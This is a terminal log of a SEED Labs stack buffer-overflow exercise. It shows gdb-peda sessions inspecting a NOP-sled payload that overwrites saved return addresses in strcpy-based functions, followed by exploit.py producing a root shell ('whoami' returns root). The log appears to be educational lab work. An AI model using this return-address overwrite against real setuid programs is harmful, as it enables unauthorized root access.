0012| 0xffffd3e8 --> 0x205 
0016| 0xffffd3ec --> 0x5655a1a0 --> 0xfbad2488 
0020| 0xffffd3f0 --> 0x905551b4 
0024| 0xffffd3f4 --> 0x90909090 
0028| 0xffffd3f8 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (
    str=0xffffd3f3 '\220' <repeats 52 times>, "Y\324\377\377", '\220' <repeats 34 times>, "Y\324\377\377", '\220' <repeats 62 times>, "Y\324\377\377", '\220' <repeats 40 times>...) at A1.c:26
26	int bof(char *str){
gdb-peda$ b myfuyn3
Function "myfuyn3" not defined.
gdb-peda$ c\
c
Undefined command: "cc".  Try "help".
gdb-peda$ c
Continuing.
3
process 7441 is executing new program: /usr/bin/zsh
Error in re-setting breakpoint 1: Function "bof" not defined.
$ exit                                                                         
[Inferior 1 (process 7441) exited normally]
Warning: not running
gdb-peda$ q
[06/17/22]seed@VM:~/.../b2_17$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b bof
Breakpoint 1 at 0x1377: file A1.c, line 26.
gdb-peda$ run
Starting program: /home/seed/practice/b2_17/A1_dbg 
Input size: 517
[----------------------------------registers-----------------------------------]
EAX: 0xffffd3f3 --> 0x90909090 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0x56557045 --> 0x3d3d3d00 ('')
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
EIP: 0x56556377 (<bof>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556372 <myfunc3+51>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556375 <myfunc3+54>:	leave  
   0x56556376 <myfunc3+55>:	ret    
=> 0x56556377 <bof>:	endbr32 
   0x5655637b <bof+4>:	push   ebp
   0x5655637c <bof+5>:	mov    ebp,esp
   0x5655637e <bof+7>:	push   ebx
   0x5655637f <bof+8>:	sub    esp,0xf4
[------------------------------------stack-------------------------------------]
0000| 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
0004| 0xffffd3e0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd3e4 --> 0x205 
0012| 0xffffd3e8 --> 0x205 
0016| 0xffffd3ec --> 0x5655a1a0 --> 0xfbad2488 
0020| 0xffffd3f0 --> 0x905551b4 
0024| 0xffffd3f4 --> 0x90909090 
0028| 0xffffd3f8 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (
    str=0xffffd3f3 '\220' <repeats 52 times>, "Y\324\377\377", '\220' <repeats 34 times>, "Y\324\377\377", '\220' <repeats 62 times>, "Y\324\377\377", '\220' <repeats 40 times>...) at A1.c:26
26	int bof(char *str){
gdb-peda$ b myfunc3
Breakpoint 2 at 0x5655633f: file A1.c, line 20.
gdb-peda$ c
Continuing.
3
[----------------------------------registers-----------------------------------]
EAX: 0x3 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0xffffd2e4 --> 0x3 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd2cc --> 0x565563e7 (<bof+112>:	add    esp,0x10)
EIP: 0x5655633f (<myfunc3>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655633a <myfunc2+81>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x5655633d <myfunc2+84>:	leave  
   0x5655633e <myfunc2+85>:	ret    
=> 0x5655633f <myfunc3>:	endbr32 
   0x56556343 <myfunc3+4>:	push   ebp
   0x56556344 <myfunc3+5>:	mov    ebp,esp
   0x56556346 <myfunc3+7>:	push   ebx
   0x56556347 <myfunc3+8>:	sub    esp,0x34
[------------------------------------stack-------------------------------------]
0000| 0xffffd2cc --> 0x565563e7 (<bof+112>:	add    esp,0x10)
0004| 0xffffd2d0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd2d4 --> 0xffffd2e4 --> 0x3 
0012| 0xffffd2d8 --> 0x205 
0016| 0xffffd2dc --> 0x5655638a (<bof+19>:	add    eax,0x2c2e)
0020| 0xffffd2e0 --> 0xffffd358 --> 0xffffd3f3 --> 0x90909090 
0024| 0xffffd2e4 --> 0x3 
0028| 0xffffd2e8 --> 0x5655a2e0 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, myfunc3 (
    str=0xffffd3f3 '\220' <repeats 52 times>, "Y\324\377\377", '\220' <repeats 34 times>, "Y\324\377\377", '\220' <repeats 62 times>, "Y\324\377\377", '\220' <repeats 40 times>...) at A1.c:20
20	int myfunc3(char* str){
gdb-peda$ disas myfunc3
Dump of assembler code for function myfunc3:
=> 0x5655633f <+0>:	endbr32 
   0x56556343 <+4>:	push   ebp
   0x56556344 <+5>:	mov    ebp,esp
   0x56556346 <+7>:	push   ebx
   0x56556347 <+8>:	sub    esp,0x34
   0x5655634a <+11>:	call   0x565564fa <__x86.get_pc_thunk.ax>
   0x5655634f <+16>:	add    eax,0x2c69
   0x56556354 <+21>:	fld    QWORD PTR [eax-0x1f50]
   0x5655635a <+27>:	fstp   QWORD PTR [ebp-0x10]
   0x5655635d <+30>:	sub    esp,0x8
   0x56556360 <+33>:	push   DWORD PTR [ebp+0x8]
   0x56556363 <+36>:	lea    edx,[ebp-0x30]
   0x56556366 <+39>:	push   edx
   0x56556367 <+40>:	mov    ebx,eax
   0x56556369 <+42>:	call   0x56556120 <strcpy@plt>
   0x5655636e <+47>:	add    esp,0x10
   0x56556371 <+50>:	nop
   0x56556372 <+51>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556375 <+54>:	leave  
   0x56556376 <+55>:	ret    
End of assembler dump.
gdb-peda$ b *0x56556375
Breakpoint 3 at 0x56556375: file A1.c, line 24.
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd298 --> 0x90909090 
EBX: 0x90909090 
ECX: 0xffffd5f0 --> 0xc031d231 
EDX: 0xffffd495 --> 0xc031d231 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd2c8 --> 0x90909090 
ESP: 0xffffd290 --> 0x5655a1a0 --> 0xfbad2488 
EIP: 0x56556375 (<myfunc3+54>:	leave)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655636e <myfunc3+47>:	add    esp,0x10
   0x56556371 <myfunc3+50>:	nop
   0x56556372 <myfunc3+51>:	mov    ebx,DWORD PTR [ebp-0x4]
=> 0x56556375 <myfunc3+54>:	leave  
   0x56556376 <myfunc3+55>:	ret    
   0x56556377 <bof>:	endbr32 
   0x5655637b <bof+4>:	push   ebp
   0x5655637c <bof+5>:	mov    ebp,esp
[------------------------------------stack-------------------------------------]
0000| 0xffffd290 --> 0x5655a1a0 --> 0xfbad2488 
0004| 0xffffd294 --> 0x5655a2e0 --> 0x90909090 
0008| 0xffffd298 --> 0x90909090 
0012| 0xffffd29c --> 0x90909090 
0016| 0xffffd2a0 --> 0x90909090 
0020| 0xffffd2a4 --> 0x90909090 
0024| 0xffffd2a8 --> 0x90909090 
0028| 0xffffd2ac --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x56556375 in myfunc3 (
    str=0x90909090 <error: Cannot access memory at address 0x90909090>)
    at A1.c:24
24	}
gdb-peda$ p (*(unsigned*)($ebp+4))
$1 = 0xffffd459
gdb-peda$ q
[06/17/22]seed@VM:~/.../b2_17$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b bof
Breakpoint 1 at 0x1377: file A1.c, line 26.
gdb-peda$ run
Starting program: /home/seed/practice/b2_17/A1_dbg 
Input size: 517
[----------------------------------registers-----------------------------------]
EAX: 0xffffd3f3 --> 0x90909090 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0x56557045 --> 0x3d3d3d00 ('')
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
EIP: 0x56556377 (<bof>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556372 <myfunc3+51>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556375 <myfunc3+54>:	leave  
   0x56556376 <myfunc3+55>:	ret    
=> 0x56556377 <bof>:	endbr32 
   0x5655637b <bof+4>:	push   ebp
   0x5655637c <bof+5>:	mov    ebp,esp
   0x5655637e <bof+7>:	push   ebx
   0x5655637f <bof+8>:	sub    esp,0xf4
[------------------------------------stack-------------------------------------]
0000| 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
0004| 0xffffd3e0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd3e4 --> 0x205 
0012| 0xffffd3e8 --> 0x205 
0016| 0xffffd3ec --> 0x5655a1a0 --> 0xfbad2488 
0020| 0xffffd3f0 --> 0x905551b4 
0024| 0xffffd3f4 --> 0x90909090 
0028| 0xffffd3f8 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (
    str=0xffffd3f3 '\220' <repeats 52 times>, "Y\324\377\377", '\220' <repeats 34 times>, "Y\324\377\377", '\220' <repeats 62 times>, "Y\324\377\377", '\220' <repeats 40 times>...) at A1.c:26
26	int bof(char *str){
gdb-peda$ b myfunc2
Breakpoint 2 at 0x565562e9: file A1.c, line 14.
gdb-peda$ c
Continuing.
2
[----------------------------------registers-----------------------------------]
EAX: 0x2 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0xffffd2e4 --> 0x2 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd2cc --> 0x565563d7 (<bof+96>:	add    esp,0x10)
EIP: 0x565562e9 (<myfunc2>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562e4 <myfunc1+55>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565562e7 <myfunc1+58>:	leave  
   0x565562e8 <myfunc1+59>:	ret    
=> 0x565562e9 <myfunc2>:	endbr32 
   0x565562ed <myfunc2+4>:	push   ebp
   0x565562ee <myfunc2+5>:	mov    ebp,esp
   0x565562f0 <myfunc2+7>:	push   ebx
   0x565562f1 <myfunc2+8>:	sub    esp,0x54
[------------------------------------stack-------------------------------------]
0000| 0xffffd2cc --> 0x565563d7 (<bof+96>:	add    esp,0x10)
0004| 0xffffd2d0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd2d4 --> 0xffffd2e4 --> 0x2 
0012| 0xffffd2d8 --> 0x205 
0016| 0xffffd2dc --> 0x5655638a (<bof+19>:	add    eax,0x2c2e)
0020| 0xffffd2e0 --> 0xffffd358 --> 0xffffd3f3 --> 0x90909090 
0024| 0xffffd2e4 --> 0x2 
0028| 0xffffd2e8 --> 0x5655a2e0 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, myfunc2 (
    str=0xffffd3f3 '\220' <repeats 52 times>, "Y\324\377\377", '\220' <repeats 34 times>, "Y\324\377\377", '\220' <repeats 62 times>, "Y\324\377\377", '\220' <repeats 40 times>...) at A1.c:14
14	int myfunc2(char* str){
gdb-peda$ disas myfunc2
Dump of assembler code for function myfunc2:
=> 0x565562e9 <+0>:	endbr32 
   0x565562ed <+4>:	push   ebp
   0x565562ee <+5>:	mov    ebp,esp
   0x565562f0 <+7>:	push   ebx
   0x565562f1 <+8>:	sub    esp,0x54
   0x565562f4 <+11>:	call   0x565564fa <__x86.get_pc_thunk.ax>
   0x565562f9 <+16>:	add    eax,0x2cbf
   0x565562fe <+21>:	mov    DWORD PTR [ebp-0x1d],0x6c6c6548
   0x56556305 <+28>:	mov    DWORD PTR [ebp-0x19],0x6f57206f
   0x5655630c <+35>:	mov    DWORD PTR [ebp-0x15],0x646c72
   0x56556313 <+42>:	mov    DWORD PTR [ebp-0x11],0x0
   0x5655631a <+49>:	mov    DWORD PTR [ebp-0xd],0x0
   0x56556321 <+56>:	mov    BYTE PTR [ebp-0x9],0x0
   0x56556325 <+60>:	sub    esp,0x8
   0x56556328 <+63>:	push   DWORD PTR [ebp+0x8]
   0x5655632b <+66>:	lea    edx,[ebp-0x56]
   0x5655632e <+69>:	push   edx
   0x5655632f <+70>:	mov    ebx,eax
   0x56556331 <+72>:	call   0x56556120 <strcpy@plt>
   0x56556336 <+77>:	add    esp,0x10
   0x56556339 <+80>:	nop
   0x5655633a <+81>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x5655633d <+84>:	leave  
   0x5655633e <+85>:	ret    
End of assembler dump.
gdb-peda$ b *0x5655633d
Breakpoint 3 at 0x5655633d: file A1.c, line 18.
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd272 --> 0x90909090 
EBX: 0x90909090 
ECX: 0xffffd5f0 --> 0xc031d231 
EDX: 0xffffd46f --> 0xc031d231 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd2c8 --> 0x90909090 
ESP: 0xffffd270 --> 0x90900003 
EIP: 0x5655633d (<myfunc2+84>:	leave)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556336 <myfunc2+77>:	add    esp,0x10
   0x56556339 <myfunc2+80>:	nop
   0x5655633a <myfunc2+81>:	mov    ebx,DWORD PTR [ebp-0x4]
=> 0x5655633d <myfunc2+84>:	leave  
   0x5655633e <myfunc2+85>:	ret    
   0x5655633f <myfunc3>:	endbr32 
   0x56556343 <myfunc3+4>:	push   ebp
   0x56556344 <myfunc3+5>:	mov    ebp,esp
[------------------------------------stack-------------------------------------]
0000| 0xffffd270 --> 0x90900003 
0004| 0xffffd274 --> 0x90909090 
0008| 0xffffd278 --> 0x90909090 
0012| 0xffffd27c --> 0x90909090 
0016| 0xffffd280 --> 0x90909090 
0020| 0xffffd284 --> 0x90909090 
0024| 0xffffd288 --> 0x90909090 
0028| 0xffffd28c --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x5655633d in myfunc2 (
    str=0x90909090 <error: Cannot access memory at address 0x90909090>)
    at A1.c:18
18	}
gdb-peda$ p (*(unsigned*)($ebp+4))
$1 = 0xffffd459
gdb-peda$ q
[06/17/22]seed@VM:~/.../b2_17$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b bof
Breakpoint 1 at 0x1377: file A1.c, line 26.
gdb-peda$ run
Starting program: /home/seed/practice/b2_17/A1_dbg 
Input size: 517
[----------------------------------registers-----------------------------------]
EAX: 0xffffd3f3 --> 0x90909090 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0x56557045 --> 0x3d3d3d00 ('')
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
EIP: 0x56556377 (<bof>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556372 <myfunc3+51>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556375 <myfunc3+54>:	leave  
   0x56556376 <myfunc3+55>:	ret    
=> 0x56556377 <bof>:	endbr32 
   0x5655637b <bof+4>:	push   ebp
   0x5655637c <bof+5>:	mov    ebp,esp
   0x5655637e <bof+7>:	push   ebx
   0x5655637f <bof+8>:	sub    esp,0xf4
[------------------------------------stack-------------------------------------]
0000| 0xffffd3dc --> 0x565564cc (<main+216>:	add    esp,0x10)
0004| 0xffffd3e0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd3e4 --> 0x205 
0012| 0xffffd3e8 --> 0x205 
0016| 0xffffd3ec --> 0x5655a1a0 --> 0xfbad2488 
0020| 0xffffd3f0 --> 0x905551b4 
0024| 0xffffd3f4 --> 0x90909090 
0028| 0xffffd3f8 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (
    str=0xffffd3f3 '\220' <repeats 52 times>, "Y\324\377\377", '\220' <repeats 34 times>, "Y\324\377\377", '\220' <repeats 62 times>, "Y\324\377\377", '\220' <repeats 40 times>...) at A1.c:26
26	int bof(char *str){
gdb-peda$ b myfunc1
Breakpoint 2 at 0x565562ad: file A1.c, line 8.
gdb-peda$ c
Continuing.
1
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0xffffd2e4 --> 0x1 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd2cc --> 0x565563c7 (<bof+80>:	add    esp,0x10)
EIP: 0x565562ad (<myfunc1>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562a4 <frame_dummy+4>:	jmp    0x56556200 <register_tm_clones>
   0x565562a9 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x565562ac <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x565562ad <myfunc1>:	endbr32 
   0x565562b1 <myfunc1+4>:	push   ebp
   0x565562b2 <myfunc1+5>:	mov    ebp,esp
   0x565562b4 <myfunc1+7>:	push   ebx
   0x565562b5 <myfunc1+8>:	sub    esp,0x94
[------------------------------------stack-------------------------------------]
0000| 0xffffd2cc --> 0x565563c7 (<bof+80>:	add    esp,0x10)
0004| 0xffffd2d0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd2d4 --> 0xffffd2e4 --> 0x1 
0012| 0xffffd2d8 --> 0x205 
0016| 0xffffd2dc --> 0x5655638a (<bof+19>:	add    eax,0x2c2e)
0020| 0xffffd2e0 --> 0xffffd358 --> 0xffffd3f3 --> 0x90909090 
0024| 0xffffd2e4 --> 0x1 
0028| 0xffffd2e8 --> 0x5655a2e0 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, myfunc1 (
    str=0xffffd3f3 '\220' <repeats 52 times>, "Y\324\377\377", '\220' <repeats 34 times>, "Y\324\377\377", '\220' <repeats 62 times>, "Y\324\377\377", '\220' <repeats 40 times>...) at A1.c:8
8	int myfunc1(char* str){
gdb-peda$ disas myfunc1
Dump of assembler code for function myfunc1:
=> 0x565562ad <+0>:	endbr32 
   0x565562b1 <+4>:	push   ebp
   0x565562b2 <+5>:	mov    ebp,esp
   0x565562b4 <+7>:	push   ebx
   0x565562b5 <+8>:	sub    esp,0x94
   0x565562bb <+14>:	call   0x565564fa <__x86.get_pc_thunk.ax>
   0x565562c0 <+19>:	add    eax,0x2cf8
   0x565562c5 <+24>:	mov    DWORD PTR [ebp-0xc],0x7
   0x565562cc <+31>:	sub    esp,0x8
   0x565562cf <+34>:	push   DWORD PTR [ebp+0x8]
   0x565562d2 <+37>:	lea    edx,[ebp-0x98]
   0x565562d8 <+43>:	push   edx
   0x565562d9 <+44>:	mov    ebx,eax
   0x565562db <+46>:	call   0x56556120 <strcpy@plt>
   0x565562e0 <+51>:	add    esp,0x10
   0x565562e3 <+54>:	nop
   0x565562e4 <+55>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565562e7 <+58>:	leave  
   0x565562e8 <+59>:	ret    
End of assembler dump.
gdb-peda$ p *0x565562e7
$1 = 0xff3c3c9
gdb-peda$ b *0x565562e7
Breakpoint 3 at 0x565562e7: file A1.c, line 12.
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd230 --> 0x90909090 
EBX: 0x90909090 
ECX: 0xffffd5f0 --> 0xc031d231 
EDX: 0xffffd42d --> 0xc031d231 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd2c8 --> 0x90909090 
ESP: 0xffffd230 --> 0x90909090 
EIP: 0x565562e7 (<myfunc1+58>:	leave)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562e0 <myfunc1+51>:	add    esp,0x10
   0x565562e3 <myfunc1+54>:	nop
   0x565562e4 <myfunc1+55>:	mov    ebx,DWORD PTR [ebp-0x4]
=> 0x565562e7 <myfunc1+58>:	leave  
   0x565562e8 <myfunc1+59>:	ret    
   0x565562e9 <myfunc2>:	endbr32 
   0x565562ed <myfunc2+4>:	push   ebp
   0x565562ee <myfunc2+5>:	mov    ebp,esp
[------------------------------------stack-------------------------------------]
0000| 0xffffd230 --> 0x90909090 
0004| 0xffffd234 --> 0x90909090 
0008| 0xffffd238 --> 0x90909090 
0012| 0xffffd23c --> 0x90909090 
0016| 0xffffd240 --> 0x90909090 
0020| 0xffffd244 --> 0x90909090 
0024| 0xffffd248 --> 0x90909090 
0028| 0xffffd24c --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x565562e7 in myfunc1 (
    str=0x90909090 <error: Cannot access memory at address 0x90909090>)
    at A1.c:12
12	}
gdb-peda$ p (*(unsigned*)($ebp+4))
$2 = 0xffffd459
gdb-peda$ q
[06/17/22]seed@VM:~/.../b2_17$ python3 exploit.py 
[06/17/22]seed@VM:~/.../b2_17$ ./A1
Input size: 517
1
# whoami                                                                       
root
# w ecxit                                                                      
zsh: command not found: ecxit
# exit                                                                         
[06/17/22]seed@VM:~/.../b2_17$ ./A1
Input size: 517
2
# whoami                                                                       
root
# exit                                                                         
[06/17/22]seed@VM:~/.../b2_17$ ./A1
Input size: 517
3
# whoami                                                                       
root
# echo " allah hafe z"                                                         
 allah hafz
#   
